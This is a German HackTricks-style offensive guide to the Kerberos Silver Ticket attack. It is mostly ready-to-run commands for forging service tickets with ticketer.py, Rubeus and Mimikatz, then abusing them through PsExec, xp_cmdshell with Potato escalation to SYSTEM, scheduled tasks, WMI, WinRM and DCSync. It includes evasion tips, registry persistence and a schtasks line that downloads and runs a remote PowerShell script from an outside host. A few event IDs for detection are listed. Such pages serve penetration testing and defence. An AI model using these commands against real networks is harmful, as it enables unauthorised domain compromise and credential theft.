# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Der **Silver Ticket**-Angriff nutzt die Ausnutzung von Service-Tickets in Active Directory (AD)-Umgebungen. Diese Methode beruht darauf, den **NTLM-Hash eines Service-Kontos** zu erlangen, z. B. eines Computer-Kontos, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich als beliebiger Benutzer ausgeben, typischerweise mit dem Ziel, administrative Privilegien zu erlangen. Es wird betont, dass die Verwendung von AES-Keys zum Fälschen von Tickets sicherer und weniger auffällig ist.

> [!WARNING]
> Silver Tickets sind weniger auffällig als Golden Tickets, weil sie nur den **Hash des Service-Kontos** benötigen, nicht das krbtgt-Konto. Sie sind jedoch auf den spezifischen Dienst beschränkt, den sie anvisieren. Oft genügt es bereits, das Passwort eines Kontos zu stehlen. Wenn du das **Passwort eines Kontos mit einem SPN** kompromittierst, kannst du dieses Passwort verwenden, um ein Silver Ticket zu erstellen, das jeden Benutzer gegenüber diesem Dienst impersonifiziert.

### Moderne Kerberos-Änderungen (AES-only Domänen)

- Windows-Updates ab dem **8. Nov 2022 (KB5021131)** setzen Service-Tickets standardmäßig, wann immer möglich, auf **AES session keys** und bauen RC4 schrittweise ab. DCs werden voraussichtlich RC4 **standardmäßig bis Mitte 2026 deaktiviert** ausliefern, sodass das Verlassen auf NTLM/RC4-Hashes für Silver Tickets zunehmend mit `KRB_AP_ERR_MODIFIED` fehlschlägt. Extrahiere immer die **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) für das Ziel-Servicekonto.
- Wenn beim Service-Konto `msDS-SupportedEncryptionTypes` auf AES beschränkt ist, musst du mit `/aes256` oder `-aesKey` fälschen; RC4 (`/rc4` oder `-nthash`) funktioniert nicht, selbst wenn du den NTLM-Hash besitzt.
- gMSA/computer accounts rotieren alle 30 Tage; extrahiere den **aktuellen AES key** aus LSASS, Secretsdump/NTDS oder per DCsync, bevor du fälschst.
- OPSEC: Die Standard-Ticket-Lebensdauer in Tools liegt oft bei **10 Jahren**; setze realistische Laufzeiten (z. B. `-duration 600` Minuten), um die Erkennung durch ungewöhnlich lange Laufzeiten zu vermeiden.

Für das Erstellen von Tickets werden je nach Betriebssystem unterschiedliche Tools verwendet:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Unter Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Der CIFS-Dienst wird als häufiges Ziel hervorgehoben, um auf das Dateisystem des Opfers zuzugreifen, aber auch andere Dienste wie HOST und RPCSS können für Aufgaben und WMI-Abfragen ausgenutzt werden.

### Beispiel: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Wenn Sie den NTLM-Hash (oder AES key) eines SQL service account (z. B. sqlsvc) haben, können Sie ein TGS für den MSSQL SPN fälschen und jeden Benutzer gegenüber dem SQL service impersonate. Von dort aktivieren Sie xp_cmdshell, um Befehle als der SQL service account auszuführen. Wenn dieses token SeImpersonatePrivilege besitzt, können Sie einen Potato chainen, um auf SYSTEM zu erhöhen.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Wenn der resultierende Kontext SeImpersonatePrivilege hat (oft der Fall bei service accounts), verwende eine Potato-Variante, um SYSTEM zu erhalten:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Mehr Details zum Missbrauch von MSSQL und zum Aktivieren von xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques Übersicht:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Verfügbare Dienste

| Diensttyp                                   | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Je nach OS auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In einigen Fällen können Sie einfach WINRM anfordern</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP-Operationen, einschließlich DCSync    | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Mit **Rubeus** können Sie **alle** diese Tickets mit dem Parameter anfordern:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event-IDs

- 4624: Konto-Anmeldung
- 4634: Konto-Abmeldung
- 4672: Admin-Anmeldung
- **Keine vorhergehenden 4768/4769 auf dem DC** für denselben Client/Service ist ein häufiges Indiz dafür, dass ein gefälschtes TGS direkt dem Dienst präsentiert wird.
- Abnorm lange Ticket-Lebensdauer oder unerwarteter Verschlüsselungstyp (RC4, wenn die Domain AES erzwingt) fallen ebenfalls in 4769/4624-Daten auf.

## Persistenz

Um zu verhindern, dass Maschinen ihr Passwort alle 30 Tage ändern, setzen Sie `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oder Sie können `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen höheren Wert als 30 days setzen, um den Rotationszeitraum anzugeben, in dem das Maschinenpasswort rotiert werden soll.

## Missbrauch von Service-Tickets

In den folgenden Beispielen nehmen wir an, dass das Ticket durch das Impersonieren des Administrator-Kontos beschafft wurde.

### CIFS

Mit diesem Ticket können Sie über **SMB** (falls freigegeben) auf die `C$` und `ADMIN$`-Freigaben zugreifen und Dateien in einen Teil des entfernten Dateisystems kopieren, indem Sie so etwas tun wie:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Sie können außerdem eine Shell auf dem Host erhalten oder beliebige Befehle mit **psexec** ausführen:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung können Sie geplante Aufgaben auf entfernten Computern erstellen und beliebige Befehle ausführen:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Mit diesen Tickets können Sie **WMI auf dem Opfersystem ausführen**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Weitere Informationen zu wmiexec findest du auf der folgenden Seite:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit winrm-Zugang zu einem Computer kannst du **darauf zugreifen** und sogar eine PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Siehe die folgende Seite, um **weitere Möglichkeiten zu erfahren, wie man mit winrm eine Verbindung zu einem Remote-Host herstellt**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachte, dass **winrm auf dem entfernten Computer aktiv sein und lauschen muss**, um darauf zugreifen zu können.

### LDAP

Mit diesem Privileg kannst du die DC-Datenbank mit **DCSync** auslesen:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Erfahre mehr über DCSync** auf der folgenden Seite:


{{#ref}}
dcsync.md
{{#endref}}


## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
